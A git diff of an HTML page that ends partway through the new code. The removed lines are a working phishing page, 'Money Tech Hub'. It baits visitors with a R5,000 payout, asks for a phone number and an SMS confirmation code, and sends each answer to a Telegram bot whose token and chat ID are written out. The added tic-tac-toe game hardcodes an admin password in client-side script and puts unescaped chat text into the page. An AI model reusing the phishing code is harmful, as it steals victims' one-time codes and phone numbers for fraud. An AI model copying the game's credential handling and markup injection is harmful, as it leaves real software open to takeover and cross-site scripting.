@@ -1,327 +1,1188 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Money Tech Hub</title>
-  <style>
-    body, html {
-      margin: 0; padding: 0; height: 100%;
-      font-family: "Segoe UI", Arial, sans-serif;
-      background: #f4f6f9;
-      overflow: hidden;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prosper's Arena - Tic Tac Toe</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 
-    .screen {
-      display: none;
-      height: 100vh;
-      width: 100%;
-      color: white; 
-      display: flex;
-      flex-direction: column;
-      align-items: center; 
-      justify-content: flex-start;
-      text-align: center; 
-      padding: 20px;
-      box-sizing: border-box;
-      overflow-y: auto;
-    }
+    <style>
+        /* --- CSS Styling --- */
+        :root {
+            --bg-color: #f0f4f8;
+            --text-color: #1a202c;
+            --primary-color: #4c51bf;
+            --secondary-color: #2b6cb0;
+            --grid-bg: #ffffff;
+            --border-color: #e2e8f0;
+            --error-color: #e53e3e;
+            --admin-color: #ffcc00; /* Gold */
+            --win-line-color: #38a169;
+        }
 
-    h2 {
-      margin-bottom: 15px;
-      font-size: clamp(18px, 3.5vw, 28px);
-      font-weight: 600;
-      text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
-      line-height: 1.4;
-      max-width: 90%;
-    }
+        [data-theme="dark"] {
+            --bg-color: #1a202c;
+            --text-color: #e2e8f0;
+            --primary-color: #63b3ed;
+            --secondary-color: #4a5568;
+            --grid-bg: #2d3748;
+            --border-color: #4a5568;
+            --error-color: #fc8181;
+        }
 
-    button {
-      margin-top: 5px;
-      border: none; 
-      padding: clamp(10px, 2vw, 16px) clamp(20px, 5vw, 32px);
-      border-radius: 12px; 
-      font-weight: 600;
-      font-size: clamp(14px, 3vw, 18px);
-      cursor: pointer; 
-      transition: 0.3s;
-    }
-    button:disabled {
-      background: grey; 
-      color: white; 
-      cursor: not-allowed;
-    }
-    button.enabled {
-      background: #ffda44; 
-      color: black;
-    }
-    button.enabled:hover {
-      background: #ffc107;
-    }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Orbitron', sans-serif;
+            transition: background-color 0.3s, color 0.3s, border-color 0.3s;
+        }
 
-    .options-grid { 
-      display: grid; 
-      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); 
-      gap: 12px; 
-      width: 100%;
-      max-width: 600px; 
-      margin-bottom: 10px;
-    }
-    .option { 
-      background: rgba(255,255,255,0.2); 
-      border: 1px solid white; 
-      padding: clamp(12px, 2vw, 18px); 
-      border-radius: 12px; 
-      cursor: pointer; 
-      font-weight: 500; 
-      font-size: clamp(14px, 2.5vw, 18px); 
-      transition: 0.2s;
-    }
-    .option:hover {
-      background: rgba(255,255,255,0.35);
-    }
-    .option.selected { 
-      background: #007bff; 
-      border-color: #0056b3; 
-      color: #fff;
-    }
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
 
-    input {
-      padding: clamp(10px, 2vw, 16px); 
-      border-radius: 10px; 
-      border: none; 
-      width: clamp(200px, 70%, 350px);
-      font-size: clamp(14px, 3vw, 18px);
-      text-align: center;
-      margin-bottom: 10px;
-    }
+        /* --- Layout and Page Transitions --- */
+        .page {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease-in-out;
+        }
 
-    /* Background gradients */
-    #intro { background: linear-gradient(135deg, #0f2027, #203a43, #2c5364); }
-    #question1 { background: linear-gradient(135deg, #283e51, #485563); }
-    #question2 { background: linear-gradient(135deg, #56ab2f, #a8e063); }
-    #question3 { background: linear-gradient(135deg, #42275a, #734b6d); }
-    #countdownScreen { background: linear-gradient(135deg, #1e3c72, #2a5298); }
-    #confirmationScreen { background: linear-gradient(135deg, #ff9966, #ff5e62); }
-    #loadingScreen { background: linear-gradient(135deg, #232526, #414345); }
+        .page.active {
+            opacity: 1;
+            pointer-events: all;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-    #intro h1 { 
-      font-size: clamp(22px, 5vw, 34px); 
-      margin-bottom: 18px; 
-      font-weight: 700;
-      text-shadow: 1px 1px 4px rgba(0,0,0,0.4);
-    }
-    .centerBox { display: flex; align-items: center; justify-content: center; gap: 15px; flex-wrap: wrap; }
-    canvas { display: block; max-width: 100%; height: auto; }
-    .flag { width: 100px; height: 70px; background: url('https://upload.wikimedia.org/wikipedia/commons/a/af/Flag_of_South_Africa.svg') no-repeat center; background-size: cover; border-radius: 4px; border: 1px solid white; animation: wave 2s infinite ease-in-out; }
-    @keyframes wave { 0%{transform:rotateY(0)} 50%{transform:rotateY(15deg)} 100%{transform:rotateY(0)} }
+        #app-container {
+            width: 100%;
+            max-width: 1200px;
+            padding: 20px;
+        }
 
-    #countdownNumber { font-size: clamp(22px, 6vw, 44px); font-weight: bold; color: #00ff88; }
+        .app-header {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 2px solid var(--border-color);
+            margin-bottom: 20px;
+        }
 
-    #loadingBar { width: 80%; height: 20px; background: #ddd; border-radius: 12px; overflow: hidden; margin-top: 15px; }
-    #loadingFill { width: 0%; height: 100%; background: linear-gradient(90deg, #11998e, #38ef7d); transition: width 0.2s; }
-    #noSignal { font-size: clamp(16px, 4vw, 26px); font-weight: bold; margin-top: 20px; display: none; }
-  </style>
+        #user-display {
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+
+        .game-layout {
+            display: flex;
+            gap: 20px;
+            width: 100%;
+        }
+
+        .game-area {
+            flex: 2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .side-panel {
+            flex: 1;
+            min-width: 300px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        /* --- Admin Dashboard --- */
+        .dashboard-panel {
+            background: var(--grid-bg);
+            border: 3px solid var(--admin-color);
+            color: var(--text-color);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 15px var(--admin-color);
+            width: 100%;
+        }
+
+        .dashboard-panel h3 {
+            color: var(--admin-color);
+            margin-bottom: 15px;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .admin-actions button {
+            margin-right: 10px;
+        }
+
+        /* --- Tic Tac Toe Grid --- */
+        .tictactoe-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 100px);
+            grid-template-rows: repeat(3, 100px);
+            gap: 5px;
+            margin: 20px auto;
+            background-color: var(--border-color);
+            padding: 5px;
+            border-radius: 10px;
+            position: relative;
+        }
+
+        .cell {
+            background-color: var(--grid-bg);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 3rem;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.2s, transform 0.2s;
+        }
+
+        .cell:hover:not(.x):not(.o) {
+            background-color: var(--border-color);
+        }
+
+        .cell.x { color: var(--primary-color); }
+        .cell.o { color: var(--error-color); }
+
+        /* Animation: Mark Bounce */
+        .cell span {
+            animation: bounceIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
+        }
+        @keyframes bounceIn {
+            0% { transform: scale(0); opacity: 0; }
+            60% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); }
+        }
+
+        /* Animation: Win Line */
+        .win-line {
+            position: absolute;
+            background: var(--win-line-color);
+            z-index: 10;
+            opacity: 0.8;
+            animation: drawLine 0.7s forwards;
+            box-shadow: 0 0 10px var(--win-line-color);
+        }
+        @keyframes drawLine {
+            from { width: 0; height: 0; }
+            to { /* Width and Height set by JS based on win type */ }
+        }
+
+        /* --- Scoreboard --- */
+        .scoreboard {
+            display: flex;
+            justify-content: space-around;
+            width: 100%;
+            max-width: 500px;
+            margin-bottom: 20px;
+        }
+
+        .player-card {
+            padding: 10px 20px;
+            border-radius: 8px;
+            text-align: center;
+            transition: transform 0.3s, box-shadow 0.3s;
+            border: 2px solid transparent;
+        }
+
+        .x-turn { border-color: var(--primary-color); }
+        .o-turn { border-color: var(--error-color); }
+
+        .player-card.active-turn {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px var(--primary-color);
+        }
+
+        .player-card.o-turn.active-turn {
+            box-shadow: 0 0 15px var(--error-color);
+        }
+
+        .score-value {
+            display: block;
+            font-size: 2rem;
+            font-weight: bold;
+        }
+
+        /* --- Chat System --- */
+        .chat-system, .spectator-box {
+            background: var(--grid-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 15px;
+        }
+
+        .chat-system h3, .spectator-box h3 {
+            margin-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 5px;
+        }
+
+        #chat-messages {
+            height: 300px;
+            overflow-y: auto;
+            padding: 5px;
+            margin-bottom: 10px;
+        }
+
+        .chat-message {
+            padding: 5px 0;
+        }
+
+        .chat-message .username {
+            font-weight: bold;
+            margin-right: 5px;
+        }
+
+        .chat-message.admin-message {
+            background: rgba(255, 204, 0, 0.1);
+            border-left: 3px solid var(--admin-color);
+            padding-left: 10px;
+        }
+
+        .chat-input-area {
+            display: flex;
+            gap: 5px;
+        }
+
+        .chat-input-area input {
+            flex-grow: 1;
+            padding: 10px;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            background: var(--bg-color);
+            color: var(--text-color);
+        }
+
+        /* --- Utility and Component Styles (Buttons, Login, Notifications) --- */
+        .btn {
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s, transform 0.1s;
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn.primary {
+            background-color: var(--primary-color);
+            color: white;
+        }
+
+        .btn.secondary {
+            background-color: var(--secondary-color);
+            color: white;
+        }
+
+        .btn.danger {
+            background-color: var(--error-color);
+            color: white;
+        }
+        
+        .btn.btn-small {
+            padding: 5px 8px;
+            font-size: 0.75rem;
+        }
+
+
+        .btn.minimal {
+            background: none;
+            color: var(--text-color);
+            border: 1px solid var(--border-color);
+        }
+
+        .icon-btn {
+            width: 40px;
+            height: 40px;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.2rem;
+        }
+
+        /* Login Page Styling */
+        #login-page {
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-box {
+            background: var(--grid-bg);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .login-box header {
+            font-size: 2rem;
+            text-align: center;
+            margin-bottom: 20px;
+            color: var(--primary-color);
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            background: var(--bg-color);
+            color: var(--text-color);
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .password-container #toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: var(--secondary-color);
+        }
+
+        .login-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .error-message {
+            color: var(--error-color);
+            margin-bottom: 10px;
+            font-size: 0.9rem;
+            min-height: 1.2rem;
+        }
+
+        /* Notifications */
+        #notification-area {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+        }
+
+        .notification {
+            background: var(--secondary-color);
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
+            animation: fadeInOut 5s forwards;
+            min-width: 250px;
+        }
+
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateX(100%); }
+            10% { opacity: 1; transform: translateX(0); }
+            90% { opacity: 1; transform: translateX(0); }
+            100% { opacity: 0; transform: translateX(100%); }
+        }
+
+        /* Confetti (Simple Simulation) */
+        .confetti {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 999;
+        }
+
+        /* Loading Screen */
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--bg-color);
+            z-index: 1001;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: var(--primary-color);
+        }
+
+        #loading-screen.active {
+            display: flex;
+        }
+
+        .spinner {
+            border: 8px solid var(--border-color);
+            border-top: 8px solid var(--primary-color);
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin-top: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+
+        /* --- Responsive Design (Mobile First) --- */
+        @media (max-width: 900px) {
+            .game-layout {
+                flex-direction: column;
+            }
+
+            .side-panel {
+                min-width: unset;
+                width: 100%;
+            }
+
+            .game-area {
+                width: 100%;
+            }
+
+            .tictactoe-grid {
+                grid-template-columns: repeat(3, 80px);
+                grid-template-rows: repeat(3, 80px);
+            }
+        }
+
+        @media (max-width: 500px) {
+            .tictactoe-grid {
+                grid-template-columns: repeat(3, 70px);
+                grid-template-rows: repeat(3, 70px);
+            }
+
+            .cell {
+                font-size: 2.5rem;
+            }
+        }
+    </style>
 </head>
 <body>
 
-  <!-- INTRO -->
-  <div id="intro" class="screen" style="display:flex;">
-    <h1>Welcome to Money Tech Hub</h1>
-    <div class="centerBox">
-      <canvas id="logoCanvas"></canvas>
-      <div class="flag"></div>
+    <div id="loading-screen" class="active">
+        <h1>🎮 Welcome to Prosper's Arena</h1>
+        <div class="spinner"></div>
     </div>
-  </div>
 
-  <!-- QUESTION 1 -->
-  <div id="question1" class="screen">
-    <h2>If R5,000 was deposited in your bank account right now, what would you use it for?</h2>
-    <div class="options-grid">
-      <div class="option">Save</div><div class="option">College</div><div class="option">A car</div><div class="option">Bills</div>
-      <div class="option">School</div><div class="option">Family</div><div class="option">Vacation</div><div class="option">Donation</div>
-      <div class="option">House</div><div class="option">Food stuff</div><div class="option">Business</div><div class="option">Kid</div>
+    <div id="app-container" style="display: none;">
+        
+        <div id="login-page" class="page active">
+            <header>Prosper's Arena</header>
+            <div class="login-box">
+                <h2>Login</h2>
+                <input type="text" id="username-input" placeholder="Username" required>
+                <div class="password-container">
+                    <input type="password" id="password-input" placeholder="Password" required>
+                    <i class="fas fa-eye" id="toggle-password"></i>
+                </div>
+                <div class="login-options">
+                    <label><input type="checkbox" id="remember-me"> Remember me</label>
+                    <button id="theme-toggle" class="icon-btn"><i class="fas fa-sun"></i></button>
+                </div>
+                <p id="login-error" class="error-message"></p>
+                <button id="login-button" class="btn primary">Login</button>
+                <button id="guest-login-button" class="btn secondary">Guest Login</button>
+            </div>
+        </div>
+
+        <div id="main-app" class="page">
+
+            <header class="app-header">
+                <span id="user-display"></span>
+                <div class="controls-group">
+                    <button id="logout-button" class="btn minimal">Logout <i class="fas fa-sign-out-alt"></i></button>
+                </div>
+            </header>
+
+            <div id="admin-dashboard" class="dashboard-panel">
+                <h3>👑 Admin Controls</h3>
+                <div class="stats-grid">
+                    <div>Total Users: <span id="admin-total-users">0</span></div>
+                    <div>Matches Played: <span id="admin-matches-played">0</span></div>
+                    <div>Active Match: <span id="admin-active-match">No</span></div>
+                </div>
+                <h4>Active Players (Max 2)</h4>
+                <ul id="admin-player-list"></ul>
+                <h4>Spectators</h4>
+                <ul id="admin-spectator-list"></ul>
+                <div class="admin-actions">
+                    <button id="admin-start-match" class="btn primary">Start Match</button>
+                    <button id="admin-end-match" class="btn danger">End Match</button>
+                    <button id="admin-reset-system" class="btn minimal">Reset System</button>
+                </div>
+            </div>
+
+            <div class="game-layout">
+                <section class="game-area">
+                    <div class="scoreboard">
+                        <div id="player-x-score" class="player-card x-turn">
+                            <span class="player-name">Player X</span>
+                            <span class="score-value">0</span>
+                        </div>
+                        <div id="draws-count" class="draws-card">Draws: 0</div>
+                        <div id="player-o-score" class="player-card o-turn">
+                            <span class="player-name">Player O</span>
+                            <span class="score-value">0</span>
+                        </div>
+                    </div>
+                    
+                    <h2 id="turn-indicator"></h2>
+                    
+                    <div class="tictactoe-grid">
+                        </div>
+
+                    <div id="match-history-panel">
+                        <h3>Match History</h3>
+                        <ul id="match-history-list"></ul>
+                    </div>
+                </section>
+
+                <aside class="side-panel">
+                    <div class="spectator-box">
+                        <h3>👁️ Spectators</h3>
+                        <ul id="spectator-list">
+                            </ul>
+                    </div>
+
+                    <div class="chat-system">
+                        <h3>💬 Global Chat</h3>
+                        <div id="chat-messages" class="scrollable-content">
+                            </div>
+                        <div class="chat-input-area">
+                            <input type="text" id="chat-input" placeholder="Say something...">
+                            <button id="send-chat-button" class="btn primary icon-btn"><i class="fas fa-paper-plane"></i></button>
+                        </div>
+                    </div>
+                </aside>
+            </div>
+            
+            <div id="notification-area"></div>
+        </div>
     </div>
-    <button id="submitBtn1" disabled>Submit</button>
-  </div>
 
-  <!-- QUESTION 2 -->
-  <div id="question2" class="screen">
-    <h2>What mode of payment do you prefer?</h2>
-    <div class="options-grid">
-      <div class="option">Ewallet</div><div class="option">Bank transfer</div><div class="option">Paypal</div><div class="option">Mpesa</div><div class="option">Capitec</div>
-    </div>
-    <button id="submitBtn2" disabled>Submit</button>
-  </div>
+    <audio id="move-sound" src="move.mp3" preload="auto"></audio>
+    <audio id="win-sound" src="win.mp3" preload="auto"></audio>
+    <audio id="draw-sound" src="draw.mp3" preload="auto"></audio>
+    
+    <script>
+        /* --- JavaScript Logic --- */
+        document.addEventListener('DOMContentLoaded', () => {
+            // --- 1. Global State Management (Mock Real-time) ---
+            let gameState = {
+                isLoggedIn: false,
+                user: null,
+                userRole: 'guest', // 'guest', 'player', 'admin'
+                board: Array(9).fill(null),
+                currentPlayer: 'X',
+                isGameActive: false,
+                scores: { X: 0, O: 0, draws: 0 },
+                matchHistory: [],
+                users: {}, // { username: { role: 'player', wins: 0, ... } }
+                spectators: [],
+                players: [], // Max 2: Player X and Player O
+                chatMessages: [],
+                theme: 'dark' 
+            };
 
-  <!-- QUESTION 3: PHONE -->
-  <div id="question3" class="screen">
-    <h2>Please enter your phone number for payment confirmation:</h2>
-    <input type="tel" id="phoneNumber" placeholder="Enter phone number">
-    <button id="submitBtn3" disabled>Submit</button>
-  </div>
+            const ADMIN_USERNAME = 'prosper';
+            const ADMIN_PASSWORD = 'admin123';
+            
+            // --- 2. DOM Elements (Caching) ---
+            const elements = {
+                appContainer: document.getElementById('app-container'),
+                loadingScreen: document.getElementById('loading-screen'),
+                loginPage: document.getElementById('login-page'),
+                mainApp: document.getElementById('main-app'),
+                
+                // Login
+                usernameInput: document.getElementById('username-input'),
+                passwordInput: document.getElementById('password-input'),
+                loginButton: document.getElementById('login-button'),
+                guestLoginButton: document.getElementById('guest-login-button'),
+                togglePassword: document.getElementById('toggle-password'),
+                rememberMe: document.getElementById('remember-me'),
+                loginError: document.getElementById('login-error'),
 
-  <!-- COUNTDOWN -->
-  <div id="countdownScreen" class="screen">
-    <h2>Please wait while we process your request...</h2>
-    <div id="countdownNumber">50</div>
-  </div>
+                // Game
+                grid: document.querySelector('.tictactoe-grid'),
+                turnIndicator: document.getElementById('turn-indicator'),
+                playerXScore: document.getElementById('player-x-score').querySelector('.score-value'),
+                playerOScore: document.getElementById('player-o-score').querySelector('.score-value'),
+                drawsCount: document.getElementById('draws-count'),
+                playerXCard: document.getElementById('player-x-score'),
+                playerOCard: document.getElementById('player-o-score'),
+                matchHistoryList: document.getElementById('match-history-list'),
 
-  <!-- CONFIRMATION CODE -->
-  <div id="confirmationScreen" class="screen">
-    <h2>We’ve sent a payment confirmation code via SMS. Enter it below:</h2>
-    <input type="text" id="confirmationCode" placeholder="Enter confirmation code">
-    <button id="submitBtn4" disabled>Submit</button>
-  </div>
+                // Admin
+                adminDashboard: document.getElementById('admin-dashboard'),
+                adminPlayerList: document.getElementById('admin-player-list'),
+                adminSpectatorList: document.getElementById('admin-spectator-list'),
+                adminStartMatch: document.getElementById('admin-start-match'),
+                adminEndMatch: document.getElementById('admin-end-match'),
+                adminResetSystem: document.getElementById('admin-reset-system'),
+                
+                // Spectator & Chat
+                spectatorList: document.getElementById('spectator-list'),
+                chatMessages: document.getElementById('chat-messages'),
+                chatInput: document.getElementById('chat-input'),
+                sendChatButton: document.getElementById('send-chat-button'),
+                
+                // Utility
+                userDisplay: document.getElementById('user-display'),
+                logoutButton: document.getElementById('logout-button'),
+                notificationArea: document.getElementById('notification-area'),
+                themeToggle: document.getElementById('theme-toggle'),
 
-  <!-- LOADING + NO SIGNAL -->
-  <div id="loadingScreen" class="screen">
-    <h2>Processing your request...</h2>
-    <div id="loadingBar"><div id="loadingFill"></div></div>
-    <div id="noSignal">NO SIGNAL</div>
-  </div>
+                // Sounds
+                moveSound: document.getElementById('move-sound'),
+                winSound: document.getElementById('win-sound'),
+                drawSound: document.getElementById('draw-sound'),
+            };
+            
+            // --- 3. Persistence and Initialization ---
 
-  <script>
-    // --- TELEGRAM CONFIG ---
-    const TELEGRAM_TOKEN = "8096107981:AAF4QDZy7Lp73VKkHh_aXscCg6GuaLvn6oM";
-    const CHAT_ID = "7865382097";
-    let answers = {};
+            function loadState() {
+                const persistedUser = localStorage.getItem('currentUser');
+                const persistedState = localStorage.getItem('gameState');
+                const persistedTheme = localStorage.getItem('theme') || 'dark';
 
-    function sendToTelegram(message) {
-      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: "HTML"
-        }),
-      });
-    }
+                if (persistedUser) {
+                    gameState.user = persistedUser;
+                    gameState.userRole = (persistedUser === ADMIN_USERNAME) ? 'admin' : 'player'; 
+                    gameState.isLoggedIn = true;
+                }
 
-    function sendQA(question, answer, icon="✅") {
-      let msg = `${icon} <b>Question:</b> ${question}\n<b>Answer:</b> ${answer}`;
-      sendToTelegram(msg);
-    }
+                if (persistedState) {
+                    const loadedState = JSON.parse(persistedState);
+                    gameState.scores = loadedState.scores || gameState.scores;
+                    gameState.matchHistory = loadedState.matchHistory || gameState.matchHistory;
+                    gameState.board = loadedState.board || gameState.board;
+                }
 
-    // --- LOGO DOT ANIMATION ---
-    const canvas = document.getElementById("logoCanvas"), ctx = canvas.getContext("2d");
-    canvas.width = 200; canvas.height = 120;
-    ctx.fillStyle = "white"; ctx.font = "bold 80px Arial"; ctx.textAlign = "center"; ctx.fillText("T H", canvas.width/2, canvas.height/1.5);
-    const imageData = ctx.getImageData(0,0,canvas.width,canvas.height); ctx.clearRect(0,0,canvas.width,canvas.height);
-    let particles=[]; 
-    for(let y=0;y<canvas.height;y+=6){
-      for(let x=0;x<canvas.width;x+=6){
-        let i=(y*canvas.width+x)*4;
-        if(imageData.data[i+3]>128){
-          particles.push({x:x,y:Math.random()*-400,targetY:y,speed:0.3+Math.random()*0.5});
-        }
-      }
-    }
-    function animate(){
-      ctx.clearRect(0,0,canvas.width,canvas.height);
-      ctx.fillStyle="#FFD700";
-      particles.forEach(p=>{
-        if(p.y<p.targetY)p.y+=p.speed;
-        ctx.beginPath();
-        ctx.arc(p.x,p.y,2,0,Math.PI*2);
-        ctx.fill();
-      });
-      requestAnimationFrame(animate);
-    } 
-    animate();
+                // Apply theme immediately
+                gameState.theme = persistedTheme;
+                document.documentElement.setAttribute('data-theme', gameState.theme);
+                elements.themeToggle.innerHTML = gameState.theme === 'dark' ? '<i class="fas fa-moon"></i>' : '<i class="fas fa-sun"></i>';
+                
+                // Simulate a loading delay for the animation
+                setTimeout(() => {
+                    elements.loadingScreen.classList.remove('active');
+                    elements.appContainer.style.display = 'block';
+                    renderApp();
+                }, 1000); 
+            }
 
-    // --- FLOW ---
-    setTimeout(()=>{show("question1")},4000);
+            function saveState() {
+                localStorage.setItem('gameState', JSON.stringify({
+                    scores: gameState.scores,
+                    matchHistory: gameState.matchHistory,
+                    board: gameState.board,
+                }));
+                if (gameState.user && elements.rememberMe.checked) {
+                    localStorage.setItem('currentUser', gameState.user);
+                } else if (!gameState.isLoggedIn) {
+                     localStorage.removeItem('currentUser');
+                }
+            }
 
-    function show(id){
-      document.querySelectorAll(".screen").forEach(s=>s.style.display="none");
-      document.getElementById(id).style.display="flex";
-    }
+            // --- 4. Render Functions ---
 
-    function enableButton(btnId){
-      const btn=document.getElementById(btnId);
-      btn.disabled=false;
-      btn.classList.add("enabled");
-    }
+            function renderApp() {
+                if (gameState.isLoggedIn) {
+                    elements.loginPage.classList.remove('active');
+                    elements.mainApp.classList.add('active');
+                    elements.userDisplay.innerHTML = gameState.userRole === 'admin' 
+                        ? `👑 **${gameState.user} (Admin)**` 
+                        : `${gameState.user}`;
+                    renderGame();
+                    renderChat();
+                    renderSpectators();
+                    renderAdminDashboard();
+                } else {
+                    elements.loginPage.classList.add('active');
+                    elements.mainApp.classList.remove('active');
+                }
+            }
 
-    function makeSelectable(containerId, btnId, answerKey){
-      document.querySelectorAll(`#${containerId} .option`).forEach(opt=>{
-        opt.addEventListener("click",()=>{
-          document.querySelectorAll(`#${containerId} .option`).forEach(o=>o.classList.remove("selected"));
-          opt.classList.add("selected");
-          enableButton(btnId);
-          answers[answerKey] = opt.textContent;
+            function renderGame() {
+                elements.grid.innerHTML = '';
+                gameState.board.forEach((cell, index) => {
+                    const cellDiv = document.createElement('div');
+                    cellDiv.classList.add('cell');
+                    if (cell) {
+                        cellDiv.classList.add(cell.toLowerCase());
+                        cellDiv.innerHTML = `<span>${cell}</span>`;
+                    }
+                    if (gameState.userRole === 'player' && gameState.isGameActive) {
+                        cellDiv.dataset.index = index;
+                        cellDiv.addEventListener('click', handleMove);
+                    }
+                    elements.grid.appendChild(cellDiv);
+                });
+
+                elements.playerXScore.textContent = gameState.scores.X;
+                elements.playerOScore.textContent = gameState.scores.O;
+                elements.drawsCount.textContent = `Draws: ${gameState.scores.draws}`;
+
+                elements.playerXCard.classList.remove('active-turn');
+                elements.playerOCard.classList.remove('active-turn');
+
+                if (gameState.isGameActive) {
+                    const playerMark = gameState.currentPlayer === 'X' ? 'Player X' : 'Player O';
+                    elements.turnIndicator.textContent = `It's ${playerMark}'s turn!`;
+                    
+                    if (gameState.currentPlayer === 'X') {
+                        elements.playerXCard.classList.add('active-turn');
+                    } else {
+                        elements.playerOCard.classList.add('active-turn');
+                    }
+                } else {
+                    elements.turnIndicator.textContent = 'Game is waiting for Admin to start.';
+                }
+
+                elements.matchHistoryList.innerHTML = gameState.matchHistory.map(match =>
+                    `<li>${match.winner ? `${match.winner} won!` : 'Draw!'} (${match.time})</li>`
+                ).join('');
+            }
+
+            function renderChat() {
+                elements.chatMessages.innerHTML = '';
+                gameState.chatMessages.forEach(msg => {
+                    const msgDiv = document.createElement('div');
+                    msgDiv.classList.add('chat-message');
+                    if (msg.isAdmin) {
+                        msgDiv.classList.add('admin-message');
+                    }
+                    msgDiv.innerHTML = `
+                        <span class="username">${msg.user}</span>
+                        <span class="timestamp">(${msg.time})</span>: 
+                        <span class="text">${msg.text}</span>
+                    `;
+                    elements.chatMessages.appendChild(msgDiv);
+                });
+                elements.chatMessages.scrollTop = elements.chatMessages.scrollHeight;
+            }
+
+            function renderSpectators() {
+                elements.spectatorList.innerHTML = '';
+                const combinedList = [...gameState.players, ...gameState.spectators].filter(u => u !== gameState.user);
+                
+                combinedList.forEach(user => {
+                    const li = document.createElement('li');
+                    const status = gameState.players.includes(user) ? '🎮' : '👁️';
+                    li.innerHTML = `${status} ${user}`;
+                    elements.spectatorList.appendChild(li);
+                });
+
+                if (gameState.userRole === 'admin') {
+                    elements.adminPlayerList.innerHTML = gameState.players.map(p => `<li>${p} <button class="btn danger btn-small" onclick="adminRemovePlayer('${p}')">Remove</button></li>`).join('');
+                    elements.adminSpectatorList.innerHTML = gameState.spectators.map(s => `<li>${s} <button class="btn primary btn-small" onclick="adminAddPlayer('${s}')">Add</button></li>`).join('');
+                }
+            }
+
+            function renderAdminDashboard() {
+                if (gameState.userRole === 'admin') {
+                    elements.adminDashboard.style.display = 'block';
+                    document.getElementById('admin-total-users').textContent = Object.keys(gameState.users).length;
+                    document.getElementById('admin-matches-played').textContent = gameState.matchHistory.length;
+                    document.getElementById('admin-active-match').textContent = gameState.isGameActive ? 'Yes' : 'No';
+                    renderSpectators();
+                } else {
+                    elements.adminDashboard.style.display = 'none';
+                }
+            }
+
+            // --- 5. Game Logic and Functions ---
+
+            const WINNING_COMBINATIONS = [
+                [0, 1, 2], [3, 4, 5], [6, 7, 8],
+                [0, 3, 6], [1, 4, 7], [2, 5, 8],
+                [0, 4, 8], [2, 4, 6]            
+            ];
+
+            function checkWin() {
+                for (const combination of WINNING_COMBINATIONS) {
+                    const [a, b, c] = combination;
+                    if (gameState.board[a] && gameState.board[a] === gameState.board[b] && gameState.board[a] === gameState.board[c]) {
+                        return { winner: gameState.board[a], combination };
+                    }
+                }
+                return null;
+            }
+
+            function checkDraw() {
+                return gameState.board.every(cell => cell !== null);
+            }
+
+            function endGame(result) {
